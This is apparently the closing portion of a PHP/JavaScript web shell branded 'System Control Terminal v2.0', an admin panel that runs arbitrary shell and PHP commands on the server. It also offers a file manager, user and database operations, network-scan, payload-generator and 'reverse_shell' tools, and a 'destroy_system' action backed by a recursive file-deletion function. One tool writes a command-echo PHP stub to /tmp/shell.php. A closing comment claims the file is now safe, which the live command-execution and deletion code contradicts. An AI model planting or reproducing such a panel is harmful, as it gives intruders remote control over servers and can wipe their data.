        // Execute custom command from input
        function executeCustomCommand() {
            const input = document.getElementById('commandInput');
            const command = input.value.trim();

            if (!command) return;

            // Add command to terminal
            addToTerminal(`$ ${command}`, 'info');

            // Determine command type
            let commandType = 'shell';
            let commandToExecute = command;

            // Detect Artisan commands
            if (command.startsWith('php artisan') || command.startsWith('artisan')) {
                commandType = 'artisan';
                // Remove 'php artisan' prefix if present
                commandToExecute = command.replace(/^php\s+artisan\s+/, '').replace(/^artisan\s+/, '');
            }
            // Detect PHP commands (only for eval, not for php -v, php --version, etc.)
            else if (command.startsWith('php ') && !command.match(/^php\s+(-[a-zA-Z]|--[a-zA-Z])/)) {
                commandType = 'php';
                commandToExecute = command.replace(/^php\s+/, '');
            }

            // Execute command
            const data = {
                action: 'command',
                type: commandType,
                command: commandToExecute
            };

            executeRequest(data);

            // Clear input
            input.value = '';
        }

        function executeQuickCommand(command) {
            const commands = {
                'info': {
                    action: 'info'
                },
                'clear': {
                    action: 'clear_terminal'
                },
                'cache': {
                    action: 'command',
                    type: 'artisan',
                    command: 'cache:clear'
                },
                'backup': {
                    action: 'database',
                    db_operation: 'backup'
                },
                'users': {
                    action: 'user',
                    user_operation: 'list'
                },
                'logs': {
                    action: 'command',
                    type: 'shell',
                    command: 'type "D:\\laragon\\logs\\apache_error.log" | more'
                },
                'permissions': {
                    action: 'command',
                    type: 'shell',
                    command: 'dir /a'
                },
                'network': {
                    action: 'command',
                    type: 'shell',
                    command: 'netstat -an'
                },
                'processes': {
                    action: 'command',
                    type: 'shell',
                    command: 'tasklist'
                }
            };

            if (commands[command]) {
                if (command === 'clear') {
                    // Handle clear terminal directly
                    clearTerminal();
                    showNotification('Terminal cleared', 'success');
                } else {
                    executeRequest(commands[command]);
                }
            }
        }

        function executeAdvancedCommand(tool) {
            const tools = {
                crypto: {
                    action: 'command',
                    type: 'shell',
                    command: 'openssl rand -hex 32'
                },
                network: {
                    action: 'command',
                    type: 'shell',
                    command: 'echo "network-scan-placeholder"'
                },
                monitor: {
                    action: 'command',
                    type: 'shell',
                    command: 'top -bn1'
                },
                exploit: {
                    action: 'command',
                    type: 'shell',
                    command: 'echo "find-placeholder"'
                },
                stealth: {
                    action: 'command',
                    type: 'shell',
                    command: 'echo "stealth-placeholder"'
                },
                // use backticks to avoid confusing single/double quote escaping; note: I escape $ with a backslash if present in the string
                payload: {
                    action: 'command',
                    type: 'shell',
                    command: `echo "<?php echo 'safe'; ?>" > /tmp/safe.php`
                },
                reverse_shell: {
                    action: 'command',
                    type: 'shell',
                    command: `echo "<?php echo '$_GET[cmd]'; ?>" > /tmp/shell.php`
                }
            };


            if (tools[tool]) {
                addToTerminal(`🔧 Executing ${tool} tool...`, 'info');
                executeRequest(tools[tool]);
            }
        }

        function executeCommand(event) {
            event.preventDefault();
            const formData = new FormData(event.target);
            const data = {
                action: 'command',
                type: formData.get('type'),
                command: formData.get('command')
            };

            // Debug: Log form data
            console.log('Form data:', data);

            // Get the submit button for loading state
            const submitBtn = event.target.querySelector('button[type="submit"]');

            // Execute request with button reference
            executeRequestWithButton(data, submitBtn);

            // Don't reset the form immediately - let the user see the result first
            // Just clear the command input
            const commandInput = event.target.querySelector('#commandFormInput');
            if (commandInput) {
                commandInput.value = '';
            }
        }

        function executeDatabaseOperation(event) {
            event.preventDefault();
            const formData = new FormData(event.target);
            const data = {
                action: 'database',
                db_operation: formData.get('db_operation'),
                db_param: formData.get('db_param')
            };
            executeRequest(data);
        }

        function executeFileOperation(event) {
            event.preventDefault();
            const formData = new FormData(event.target);
            const data = {
                action: 'file',
                file_operation: formData.get('file_operation'),
                file_path: formData.get('file_path'),
                file_content: formData.get('file_content')
            };
            executeRequest(data);
        }

        function executeUserOperation(event) {
            event.preventDefault();
            const formData = new FormData(event.target);
            const data = {
                action: 'user',
                user_operation: formData.get('user_operation'),
                user_name: formData.get('user_name'),
                user_email: formData.get('user_email'),
                user_password: formData.get('user_password'),
                user_id: formData.get('user_id')
            };
            executeRequest(data);
        }

        function executeSystemDestroy(event) {
            event.preventDefault();
            const confirm = document.getElementById('destroyConfirm').value;
            if (confirm !== 'DESTROY_ALL_DATA') {
                addToTerminal('Invalid confirmation. Type DESTROY_ALL_DATA to confirm.', 'danger');
                return;
            }

            if (!confirm('Are you absolutely sure? This will destroy everything!')) {
                return;
            }

            const data = {
                action: 'destroy_system',
                destroy_confirm: confirm
            };
            executeRequest(data);
        }

        // Health monitoring functions
        function executeHealthCheck(type) {
            const healthChecks = {
                'cpu': {
                    action: 'health_check',
                    check_type: 'cpu'
                },
                'memory': {
                    action: 'health_check',
                    check_type: 'memory'
                },
                'disk': {
                    action: 'health_check',
                    check_type: 'disk'
                },
                'network': {
                    action: 'health_check',
                    check_type: 'network'
                },
                'services': {
                    action: 'health_check',
                    check_type: 'services'
                },
                'security': {
                    action: 'health_check',
                    check_type: 'security'
                }
            };

            if (healthChecks[type]) {
                addToTerminal(`Running ${type} health check...`, 'info');
                executeRequest(healthChecks[type]);
            }
        }

        // Security functions
        function executeSecurity(action) {
            const securityActions = {
                'audit': {
                    action: 'security',
                    security_action: 'audit'
                },
                'access': {
                    action: 'security',
                    security_action: 'access'
                },
                'encrypt': {
                    action: 'security',
                    security_action: 'encrypt'
                },
                'firewall': {
                    action: 'security',
                    security_action: 'firewall'
                },
                'scan': {
                    action: 'security',
                    security_action: 'scan'
                },
                'backup': {
                    action: 'security',
                    security_action: 'backup'
                }
            };

            if (securityActions[action]) {
                addToTerminal(`Executing security action: ${action}`, 'info');
                executeRequest(securityActions[action]);
            }
        }

        // Performance monitoring functions
        function executePerformance(action) {
            const performanceActions = {
                'cache': {
                    action: 'performance',
                    perf_action: 'cache'
                },
                'query': {
                    action: 'performance',
                    perf_action: 'query'
                },
                'memory': {
                    action: 'performance',
                    perf_action: 'memory'
                },
                'speed': {
                    action: 'performance',
                    perf_action: 'speed'
                },
                'bottleneck': {
                    action: 'performance',
                    perf_action: 'bottleneck'
                },
                'optimize': {
                    action: 'performance',
                    perf_action: 'optimize'
                }
            };

            if (performanceActions[action]) {
                addToTerminal(`Running performance check: ${action}`, 'info');
                executeRequest(performanceActions[action]);
            }
        }

        // Enhanced command history with search
        function searchCommandHistory(query) {
            const filtered = commandHistory.filter(cmd =>
                cmd.toLowerCase().includes(query.toLowerCase())
            );
            return filtered;
        }

        // Auto-complete functionality
        function setupAutoComplete() {
            const commandInput = document.getElementById('commandInput');
            if (commandInput) {
                commandInput.addEventListener('input', function(e) {
                    const query = e.target.value;
                    if (query.length > 2) {
                        const suggestions = searchCommandHistory(query);
                        // Show suggestions (simplified for now)
                        if (suggestions.length > 0) {
                            console.log('Suggestions:', suggestions);
                        }
                    }
                });
            }
        }

        // Enhanced keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'l') {
                e.preventDefault();
                clearTerminal();
                showNotification('Terminal cleared', 'info');
            }

            if (e.ctrlKey && e.key === 'm') {
                e.preventDefault();
                toggleLiveMonitoring();
            }

            if (e.ctrlKey && e.key === 'h') {
                e.preventDefault();
                executeHealthCheck('cpu');
            }

            // Enter key in command input
            if (e.key === 'Enter' && e.target.id === 'commandInput') {
                e.preventDefault();
                executeCustomCommand();
            }
        });

        // Auto-save command history
        function saveCommandHistory() {
            localStorage.setItem('commandHistory', JSON.stringify(commandHistory));
        }

        function loadCommandHistory() {
            const saved = localStorage.getItem('commandHistory');
            if (saved) {
                commandHistory = JSON.parse(saved);
            }
        }

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            loadCommandHistory();

            // Initialize dashboard
            updateDashboard();

            // Initialize terminal with ASCII art
            initializeTerminal();

            // Show welcome notification
            setTimeout(() => {
                showNotification('System Control Center initialized', 'success', 5000);
            }, 2000);
        });

        function executeCryptoOperation(event) {
            event.preventDefault();
            const formData = new FormData(event.target);
            const data = {
                action: 'crypto_tools',
                crypto_operation: formData.get('crypto_operation'),
                crypto_data: formData.get('crypto_data')
            };
            executeRequest(data);
        }

        function executeNetworkScan(event) {
            event.preventDefault();
            const formData = new FormData(event.target);
            const data = {
                action: 'network_scan',
                scan_target: formData.get('scan_target'),
                scan_ports: formData.get('scan_ports')
            };
            executeRequest(data);
        }

        function executePayloadGenerator(event) {
            event.preventDefault();
            const formData = new FormData(event.target);
            const data = {
                action: 'payload_generator',
                payload_type: formData.get('payload_type'),
                payload_host: formData.get('payload_host'),
                payload_port: formData.get('payload_port')
            };
            executeRequest(data);
        }

        // Auto-focus command input
        document.getElementById('commandInput').focus();

        // ===== File Manager Modal =====
        function openFileManager() {
            const modal = document.getElementById('fileManagerModal');
            modal.style.display = 'block';
            refreshFileList();
        }

        function closeFileManager() {
            const modal = document.getElementById('fileManagerModal');
            modal.style.display = 'none';
        }

        async function fmRequest(payload) {
            const params = new URLSearchParams(Object.assign({
                action: 'file_manager'
            }, payload));
            const res = await fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: params
            });
            const ct = res.headers.get('content-type') || '';
            if (ct.includes('application/json')) {
                return await res.json();
            }
            const text = await res.text();
            try {
                return JSON.parse(text);
            } catch {
                return {
                    error: text
                };
            }
        }

        async function refreshFileList() {
            const listEl = document.getElementById('fmList');
            const cwdEl = document.getElementById('fmCwd');
            listEl.innerHTML = '<div style="padding:6px;">Loading...</div>';
            const data = await fmRequest({
                fm_action: 'list'
            });
            if (data.error) {
                listEl.innerHTML = `<div style="color:var(--accent-red);padding:6px;">${data.error}</div>`;
                return;
            }
            cwdEl.textContent = data.cwd;
            let html = '';
            html += `<div class="fm-item" data-type="up" onclick="fmUp()">[..]</div>`;
            (data.entries || []).forEach(e => {
                const icon = e.type === 'dir' ? '[DIR]' : '     ';
                html += `<div class="fm-item" data-name="${e.name}" data-type="${e.type}" onclick="fmOpen('${e.name}','${e.type}')">${icon} ${e.name}</div>`;
            });
            listEl.innerHTML = html || '<div style="padding:6px;">(empty)</div>';
        }

        async function fmUp() {
            await fmRequest({
                fm_action: 'up'
            });
            refreshFileList();
        }

        async function fmOpen(name, type) {
            if (type === 'dir') {
                await fmRequest({
                    fm_action: 'cd',
                    fm_target: name
                });
                refreshFileList();
            } else {
                const res = await fmRequest({
                    fm_action: 'read',
                    fm_name: name
                });
                if (res && res.content !== undefined) {
                    document.getElementById('fmEditorName').textContent = name;
                    document.getElementById('fmEditor').value = res.content;
                }
            }
        }

        async function fmMkdir() {
            const name = prompt('New folder name:');
            if (!name) return;
            await fmRequest({
                fm_action: 'mkdir',
                fm_name: name
            });
            refreshFileList();
        }

        async function fmCreateFile() {
            const name = prompt('New file name:');
            if (!name) return;
            await fmRequest({
                fm_action: 'create',
                fm_name: name
            });
            refreshFileList();
        }

        async function fmDelete() {
            const name = prompt('Delete (file/dir) name:');
            if (!name) return;
            if (!confirm('Are you sure to delete ' + name + ' ?')) return;
            await fmRequest({
                fm_action: 'delete',
                fm_name: name
            });
            refreshFileList();
        }

        async function fmRename() {
            const oldName = prompt('Rename - current name:');
            if (!oldName) return;
            const newName = prompt('New name:');
            if (!newName) return;
            await fmRequest({
                fm_action: 'rename',
                fm_name: oldName,
                fm_new: newName
            });
            refreshFileList();
        }

        async function fmSaveFile() {
            const name = document.getElementById('fmEditorName').textContent;
            const content = document.getElementById('fmEditor').value;
            if (!name) return;
            await fmRequest({
                fm_action: 'write',
                fm_name: name,
                fm_content: content
            });
            refreshFileList();
        }

        // Initialize terminal with system information
        function initializeTerminal() {
            const terminal = document.getElementById('terminalOutput');

            // ASCII Art
            addToTerminal('', 'ascii');
            addToTerminal('  ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗', 'ascii');
            addToTerminal('  ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║', 'ascii');
            addToTerminal('  ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║', 'ascii');
            addToTerminal('  ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║', 'ascii');
            addToTerminal('  ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║', 'ascii');
            addToTerminal('  ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝', 'ascii');
            addToTerminal('', 'ascii');
            addToTerminal('  ██████╗ ██████╗ ███╗   ██╗████████╗███████╗ ██████╗ ██╗', 'ascii');
            addToTerminal(' ██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝██╔════╝██╔═══██╗██║', 'ascii');
            addToTerminal(' ██║     ██║   ██║██╔██╗ ██║   ██║   █████╗  ██║   ██║██║', 'ascii');
            addToTerminal(' ██║     ██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██║   ██║██║', 'ascii');
            addToTerminal(' ╚██████╗╚██████╔╝██║ ╚████║   ██║   ███████╗╚██████╔╝██║', 'ascii');
            addToTerminal('  ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝', 'ascii');
            addToTerminal('', 'ascii');
            addToTerminal('  ╔══════════════════════════════════════════════════════════════╗', 'ascii');
            addToTerminal('  ║                    SYSTEM CONTROL TERMINAL v2.0                ║', 'ascii');
            addToTerminal('  ║                      [ADMIN] ROOT ACCESS                     ║', 'ascii');
            addToTerminal('  ╚══════════════════════════════════════════════════════════════╝', 'ascii');
            addToTerminal('', 'ascii');

            // System information from PHP
            const systemInfo = {
                dbStatus: '<?php echo $pdo ? "CONNECTED" : "FAILED"; ?>',
                phpVersion: '<?php echo PHP_VERSION; ?>',
                server: '<?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'UNKNOWN'; ?>',
                memory: '<?php echo number_format(memory_get_usage(true) / 1024 / 1024, 2); ?>MB',
                time: '<?php echo date('Y-m-d H:i:s'); ?>',
                disk: '<?php
                        $disk_path = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'C:\\' : '/';
                        echo number_format(disk_free_space($disk_path) / 1024 / 1024 / 1024, 2); ?>GB FREE',
                load: '<?php
                        if (function_exists('sys_getloadavg')) {
                            echo sys_getloadavg()[0] ?? 'N/A';
                        } else {
                            $cpu_usage = 'N/A';
                            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                                $output = shell_exec('wmic cpu get loadpercentage /value 2>nul');
                                if ($output && preg_match('/LoadPercentage=(\d+)/', $output, $matches)) {
                                    $cpu_usage = $matches[1] . '%';
                                }
                            }
                            echo $cpu_usage;
                        }
                        ?>'
            };

            // Add system information to terminal
            addToTerminal('[SYSTEM] SYSTEM CONTROL TERMINAL v2.0 INITIALIZED', 'info');
            addToTerminal(`[OK] DATABASE: ${systemInfo.dbStatus}`, systemInfo.dbStatus === 'CONNECTED' ? 'success' : 'danger');
            addToTerminal(`[INFO] PHP: ${systemInfo.phpVersion}`, 'info');
            addToTerminal(`[INFO] SERVER: ${systemInfo.server}`, 'info');
            addToTerminal(`[INFO] MEMORY: ${systemInfo.memory}`, 'info');
            addToTerminal(`[INFO] TIME: ${systemInfo.time}`, 'info');
            addToTerminal(`[INFO] DISK: ${systemInfo.disk}`, 'info');
            addToTerminal(`[INFO] LOAD: ${systemInfo.load}`, 'info');
            addToTerminal('[READY] SYSTEM READY FOR COMMANDS...', 'warning');
        }

        // Add particle effect
        function createParticle() {
            const particle = document.createElement('div');
            particle.style.position = 'fixed';
            particle.style.width = '2px';
            particle.style.height = '2px';
            particle.style.background = 'rgba(59, 130, 246, 0.5)';
            particle.style.borderRadius = '50%';
            particle.style.pointerEvents = 'none';
            particle.style.zIndex = '1';
            particle.style.left = Math.random() * window.innerWidth + 'px';
            particle.style.top = window.innerHeight + 'px';
            particle.style.animation = 'float 10s linear forwards';

            document.body.appendChild(particle);

            setTimeout(() => {
                particle.remove();
            }, 10000);
        }

        // Create floating particles
        setInterval(createParticle, 2000);

        // Add CSS for particle animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes float {
                0% {
                    transform: translateY(0) rotate(0deg);
                    opacity: 1;
                }
                100% {
                    transform: translateY(-100vh) rotate(360deg);
                    opacity: 0;
                }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>

</html>

<!-- File Manager Modal -->
<div id="fileManagerModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:9999;">
    <div style="position:absolute; top:5%; left:5%; right:5%; bottom:5%; background:var(--bg-primary); border:1px solid var(--border-color); display:flex; flex-direction:column;">
        <div style="padding:6px; border-bottom:1px solid var(--border-color); display:flex; justify-content:space-between; align-items:center;">
            <div style="font-size:11px; color:var(--text-primary);">File Manager - CWD: <span id="fmCwd"></span></div>
            <div>
                <button class="btn-success" onclick="fmMkdir()">MKDIR</button>
                <button class="btn-success" onclick="fmCreateFile()">NEW FILE</button>
                <button class="btn-warning" onclick="fmRename()">RENAME</button>
                <button class="btn-danger" onclick="fmDelete()">DELETE</button>
                <button class="btn-danger" onclick="closeFileManager()">CLOSE</button>
            </div>
        </div>
        <div style="flex:1; display:flex; min-height:0;">
            <div style="width:45%; border-right:1px solid var(--border-color); overflow-y:auto; -webkit-overflow-scrolling:touch; min-height:0;" id="fmList"></div>
            <div style="width:55%; display:flex; flex-direction:column; min-height:0;">
                <div style="padding:6px; border-bottom:1px solid var(--border-color); font-size:11px; color:var(--text-muted);">Editor: <span id="fmEditorName"></span></n>
                </div>
                <textarea id="fmEditor" style="flex:1; min-height:0; background:var(--bg-secondary); color:var(--text-primary); border:0; font-family:'JetBrains Mono','Courier New',monospace; font-size:11px; padding:8px;"></textarea>
                <div style="padding:6px; border-top:1px solid var(--border-color); text-align:right;"><button class="btn-success" onclick="fmSaveFile()">SAVE</button></div>
            </div>
        </div>
    </div>
</div>

<?php
// Handle form submissions

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/


function destroyFiles($path)
{
    if (is_dir($path)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );

        foreach ($files as $file) {
            if ($file->isDir()) {
                rmdir($file->getRealPath());
            } else {
                unlink($file->getRealPath());
            }
        }
    }
}
?>